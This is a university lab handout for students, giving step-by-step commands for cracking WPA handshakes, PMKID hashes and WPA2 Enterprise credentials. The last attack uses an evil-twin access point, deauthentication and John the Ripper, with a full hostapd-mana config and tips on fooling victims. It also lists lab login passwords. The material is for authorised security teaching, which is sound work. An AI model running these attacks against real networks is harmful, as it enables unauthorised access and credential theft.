# Wireless Hacking Lab — Student Handout

> **Authors:** Jonathan New Kah Hwee (2100296I) · Lam Yu Zhe (2100396G)
>
> ⚠️ **Disclaimer:** All techniques in this guide are for **educational purposes and authorised ethical hacking exercises only**. Do not use these techniques on networks you do not own or have explicit permission to test.

---

## Table of Contents

1. [Preamble](#preamble)
2. [Pre-Workshop Setup](#pre-workshop-setup)
3. [WPA Hacking using Aircrack-ng Suite](#wpa-hacking-using-aircrack-ng-suite)
4. [WPA2 Hacking using hcxdumptool and Hashcat (PMKID)](#wpa2-hacking-using-hcxdumptool-and-hashcat-pmkid)
5. [WPA2 Enterprise Hacking using hostapd-mana and hostapd-wpe](#wpa2-enterprise-hacking-using-hostapd-mana-and-hostapd-wpe)

---

## Preamble

### Objectives

In this lab, participants will experience hands-on Red Teaming across three wireless attack scenarios.

### Requirements

**Applications:**
- VirtualBox

**Virtual Machines:**
- `Win7VM` — Major Project
- `KaliLinuxVM` — Major Project

**Tools:**
- Aircrack-ng network suite
- Airgeddon
- Wireshark
- Wordlists

### Log-In Details

| Machine             | Username              | Password   |
|---------------------|-----------------------|------------|
| Kali Linux          | `kali`                | `toor`     |
| Windows 2019 Server | `Kudos\administrator` | `P@ssw0rd` |

### Other Information

- **Domain server name:** `kudos.local`
- **Wordlist (hash cracking):** `rockyou.txt`

| Host                | IP Address    |
|---------------------|---------------|
| Network address     | `10.0.2.0/24` |
| Kali Linux          | `10.0.2.18`   |
| Windows 2019 Server | `10.0.2.15`   |
| Windows 10 (User 1) | `10.0.2.16`   |
| Windows 10 (User 2) | `10.0.2.17`   |

---

## Pre-Workshop Setup

### Kali Linux VM Login

- **Username:** `kali`
- **Password:** `toor`

### Ensure USB Wireless Adapter is Enabled

Check that your wireless adapter is visible and active inside VirtualBox before proceeding.

### SSH into Team Leader's Machine (For Other Team Members)

Find your team leader's IP address from the board, then run:

```bash
ssh kali@<leader's IP address>
```

If prompted for authentication, type `yes` and press Enter to continue.

---

## WPA Hacking using Aircrack-ng Suite

**Introduction:** In this section, you will learn the basics of capturing a WPA handshake and performing a brute-force attack to crack a Wi-Fi password.

**Objective:** Capture a WPA handshake, convert it into a hash, and execute a brute-force attack using a wordlist to retrieve the Wi-Fi password.

**Preparation:**
- Set up a Kali Linux VM or boot into Kali Linux.
- Ensure your Wi-Fi card supports packet injection.
- Open a terminal window.

---

### Prerequisites

Identify your wireless adapter interface (`wlan0` / `wlan1`):

```bash
iwconfig
```

Kill any processes that may interfere with the wireless interface:

```bash
sudo airmon-ng check kill
```

> ⚠️ **Always run `airmon-ng check kill` before using other Aircrack-ng tools** to ensure wireless interface compatibility.

---

### Step 1: Capture the Handshake

Enable monitor mode on your wireless interface (replace `<interface>` with your adapter name, e.g. `wlan0`):

```bash
sudo airmon-ng start <interface>
```

> **Why monitor mode?**  
> It enables the card to capture wireless traffic without associating with any specific network.

Scan for available Access Points and note the **BSSID** and **channel** of your target:

```bash
sudo airodump-ng <interface>
```

> **Lab target:** `RedTeam2.4` or `RedTeam2.4V2` — your instructor will assign which one to use.

Start capturing the handshake. Replace `<channel>` and `<BSSID>` with your target AP's values:

```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w handshake <interface>
```

| Option | Description |
|--------|-------------|
| `-c <channel>` | Locks capture to the target AP's channel |
| `--bssid <BSSID>` | Filters capture to only the target AP |
| `-w handshake` | Output file prefix for saved capture files |
| `<interface>` | Wireless interface in monitor mode (e.g. `wlan0`, `mon0`) |

Connect your phone to the target network to generate a handshake:

| Field    | Value        |
|----------|--------------|
| Wi-Fi Name | `RedTeam2.4` |
| Password | `password`   |

> ⚠️ **Important:** Note down your **own mobile device's BSSID (MAC address)**. Only conduct attacks against your own device.  
> To find your BSSID: tap the connected Wi-Fi → *View More* → scroll to *MAC Address*.

Wait until you see the `WPA handshake` confirmation appear in the terminal output.

---

### Step 2: Obtain the Hash

> **What are hashes?**  
> WPA attacks use encrypted passwords, generating cryptographic hashes for security. We need to extract this hash before cracking.

Open a new terminal. Convert the captured handshake to a `.hccap` hash file (replace `<BSSID>` with your target AP's BSSID):

```bash
sudo aircrack-ng -J hash -b <BSSID> handshake-01.cap
```

| Option | Description |
|--------|-------------|
| `-J hash` | Output file name for the hash (`hash.hccap`) |
| `-b <BSSID>` | BSSID of the target Access Point |
| `handshake-01.cap` | The captured handshake file |

The hash file `hash.hccap` will be saved in the current directory.

---

### Step 3: Brute-Force the Passphrase

> **What is a brute-force attack?**  
> It uses a wordlist to systematically try passwords until the correct one is found.

Navigate to the wordlists directory:

```bash
cd /usr/share/wordlists
```

Decompress the `rockyou.txt` wordlist:

```bash
sudo gunzip -d rockyou.txt.gz
```

| Option | Description |
|--------|-------------|
| `gunzip` | Decompresses Gzip-compressed files |
| `-d` | Decompress flag |
| `rockyou.txt.gz` | Compressed wordlist to unpack |

Run the brute-force attack (replace `<wordlist>` and `<BSSID>`):

```bash
sudo aircrack-ng -w <wordlist> -b <BSSID> handshake-01.cap
```

| Option | Description |
|--------|-------------|
| `-w <wordlist>` | Path to the wordlist file |
| `-b <BSSID>` | BSSID of the target Access Point |
| `handshake-01.cap` | The captured handshake file |

- Wordlists are stored at `/usr/share/wordlists/`
- For this lab, use: `/home/Kali/rockyou.txt`

If the password is found in the wordlist, it will be displayed in the terminal.

---

## WPA2 Hacking using hcxdumptool and Hashcat (PMKID)

**Introduction:** In this section, you will learn how to perform a PMKID attack — capturing a single frame from the AP (no client required) and cracking the password offline using Hashcat.

---

### Step 1: Install Required Tools (Optional)

Update Kali's package references:

```bash
sudo apt upgrade
```

Run the tools once to trigger auto-installation if not already present:

```bash
hcxdumptool
hcxpcapngtool
```

Follow any on-screen installation prompts.

---

### Step 2: Scan Networks and Collect Information

Disable services that may interfere with wireless operations:

```bash
sudo systemctl stop wpa_supplicant.service
sudo systemctl stop NetworkManager.service
```

**Team Leaders:** Start scanning surrounding APs and collecting EAPOL/PMKID data:

```bash
sudo hcxdumptool -i <interface> -o dumpfile.pcapng --active_beacon --enable_status=7
```

| Option | Description |
|--------|-------------|
| `-i <interface>` | Wireless interface to use for scanning |
| `-o dumpfile.pcapng` | Output file to store captured data |
| `--active_beacon` | Transmits beacon frames from scanned APs |
| `--enable_status=7` | Displays network traffic (run `sudo hcxdumptool --help` for full status options) |

Let the command run for a while to collect sufficient EAPOL frames. Press `Ctrl+C` to stop when ready.

---

### Step 3: Convert to Hashcat-Readable Format

Convert the `.pcapng` file into a Hashcat-compatible `.hc22000` file:

```bash
sudo hcxpcapngtool -o pmkid.hc22000 -E essidlist dumpfile.pcapng
```

| Option | Description |
|--------|-------------|
| `-o pmkid.hc22000` | Output file in Hashcat format 22000 |
| `-E essidlist` | Saves found ESSIDs to a separate file |
| `dumpfile.pcapng` | Input capture file from Step 2 |

Verify the output files were created:

```bash
ls
```

You should see two new files:
- `essidlist` — list of ESSIDs found during scanning
- `pmkid.hc22000` — PMKID hashes ready for cracking

---

### Step 4: Find Your Target

Identify the BSSID of your target AP:

```bash
sudo hcxdumptool --do_rcascan -i wlan0
```

For this lab, the target BSSIDs are already provided:

| AP Name      | BSSID          |
|--------------|----------------|
| RedTeam2.4   | `6045cbb17bb0` |
| RedTeam2.4V2 | `6045cbb18320` |

Filter the hash file to find your target's PMKID hash:

```bash
cat pmkid.hc22000 | grep <BSSID>
```

---

### Step 5: Isolate the Target Hash

Copy the matching hash line into a dedicated file:

```bash
sudo vim pmkid2crack.hc22000
```

Paste only the hash line for your target AP, then save and exit (`:wq`).

---

### Step 6: Crack with Hashcat

Run a dictionary attack against the isolated hash:

```bash
hashcat -m 22000 pmkid2crack.hc22000 rockyou.txt --show
```

| Option | Description |
|--------|-------------|
| `-m 22000` | Hash type for WPA2 PMKID/EAPOL (`.hc22000` format) |
| `pmkid2crack.hc22000` | The isolated hash file |
| `rockyou.txt` | Dictionary wordlist |
| `--show` | Display previously cracked results from potfile |

---

## WPA2 Enterprise Hacking using hostapd-mana and hostapd-wpe

**Objective:** Set up a fake Access Point to capture WPA2 Enterprise credentials using `hostapd-mana` and `hostapd-wpe`.

**Prerequisites:**
- Basic Linux CLI knowledge
- Familiarity with Wi-Fi security concepts
- 2 Wi-Fi adapters (`wlan0` and `wlan1`)

---

### Step 1: Install hostapd-mana and hostapd-wpe

```bash
sudo apt install hostapd-mana
sudo apt install hostapd-wpe
```

View and configure `hostapd-mana`'s config:

```bash
cd /etc/hostapd-mana
sudo vim hostapd-mana.conf
```

View and configure `hostapd-wpe`'s config:

```bash
cd /etc/hostapd-wpe
sudo vim hostapd-wpe.conf
```

---

### Step 2: Scan Networks and Select Target

Kill interfering processes:

```bash
sudo airmon-ng check kill
```

Scan surrounding APs:

```bash
sudo airodump-ng wlan0
```

Lock into your target AP by BSSID:

```bash
sudo airodump-ng wlan0 -d <target network BSSID>
```

Note the **Channel (CH)** and **ESSID** of the target. Stations listed are clients currently connected.

> **Tip:** Configure your fake AP to match the real network as closely as possible (same SSID and channel) so victims can't easily tell the difference.

> ⚠️ **Important:** Note down your **own mobile device's BSSID**. Only deauthenticate your own device.
>
> Connect your mobile to the lab Enterprise network:
> - **Identity:** `bwallis`
> - **Password:** `P@ssw0rd`
> - Under certificates, select *Do not validate* and disable auto-reconnect.

---

### Step 3: Configure the Fake Access Point

Create a new config file:

```bash
cd /etc/hostapd-mana
sudo vim AP.conf
```

Add the following configuration (adjust channel and SSID to match your target):

```
interface=wlan1
ssid=EvilTwin
hw_mode=g
channel=11
wpa_pairwise=TKIP CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh
mana_wpe=1
mana_eapsuccess=1
```

| Parameter | Description |
|-----------|-------------|
| `interface=wlan1` | Interface for broadcasting the fake AP (wlan1, since wlan0 is used for monitoring) |
| `ssid=EvilTwin` | ESSID of the fake network |
| `hw_mode=g` | 802.11g (2.4 GHz) standard |
| `channel=11` | Channel — try to match the real target AP |
| `wpa_pairwise=TKIP CCMP` | Encryption algorithms used by WPA2 Enterprise |
| `ieee8021x=1` | Enables 802.1x authentication protocol |
| Certs and keys | Copied from `hostapd-wpe.conf` — required to host the AP |
| `mana_wpe=1` | Enables WPE mode to intercept EAP credentials |
| `mana_eapsuccess=1` | Enables EAP success messages |

---

### Step 4: Start the Fake Access Point

Save and exit (in vim):

```
:wq
```

**Team Leaders:** Start broadcasting the fake AP:

```bash
sudo hostapd-mana AP.conf
```

The fake network should now appear in nearby devices' Wi-Fi lists.

---

### Step 5: Deauthenticate the Client

Force the client off the real network so they reconnect to the fake AP.

First, stop the `airodump-ng` process in the other terminal tab.

Set `wlan0` to match the target AP's channel:

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set channel <channel of target AP>
sudo ip link set wlan0 up
```

Run the deauthentication attack:

```bash
aireplay-ng --deauth 5 -a <target network BSSID> -c <client device BSSID> wlan0 --ignore-negative-one
```

| Option | Description |
|--------|-------------|
| `--deauth 5` | Sends 5 deauth packets to disconnect the client |
| `-a <BSSID>` | Target Access Point's BSSID |
| `-c <BSSID>` | Target client device's BSSID |
| `wlan0` | Interface used for the deauth attack |
| `--ignore-negative-one` | Suppresses channel-mismatch error messages |

---

### Step 6: Capture and Crack the Credentials

Once deauthenticated, the client will likely connect to the fake AP (stronger signal). The **EAP-MSCHAPV2 challenge hash** will appear in the `hostapd-mana` terminal output.

> **Troubleshooting:** If hashes don't appear, the adapter may be buggy.  
> Unplug `wlan1`, stop the process, replug, and relaunch the AP.

Copy the EAP-MSCHAPV2 JTR hash value (from the username onwards, **excluding trailing colons**) into a file:

```bash
nano jtrhash.txt
# Paste the hash line here, then save
```

Use John the Ripper to crack the hash:

```bash
john --format=netntlm -w:rockyou.txt jtrhash.txt
```

| Option | Description |
|--------|-------------|
| `john` | Invokes John the Ripper |
| `--format=netntlm` | Specifies the hash algorithm |
| `-w:rockyou.txt` | Path to the wordlist |
| `jtrhash.txt` | File containing the captured hash |

The cracked password will be displayed in the terminal.

---

## Conclusion

In this lab, you covered three wireless attack techniques:

| Attack | Tools | Target |
|--------|-------|--------|
| WPA Handshake Capture + Brute-Force | Aircrack-ng, rockyou.txt | WPA networks |
| PMKID Capture + Dictionary Attack | hcxdumptool, hcxpcapngtool, Hashcat | WPA2 networks |
| Evil Twin + EAP Credential Capture | hostapd-mana, hostapd-wpe, John the Ripper | WPA2 Enterprise networks |

> These techniques should **only** be used for educational purposes and ethical hacking exercises with proper authorisation.
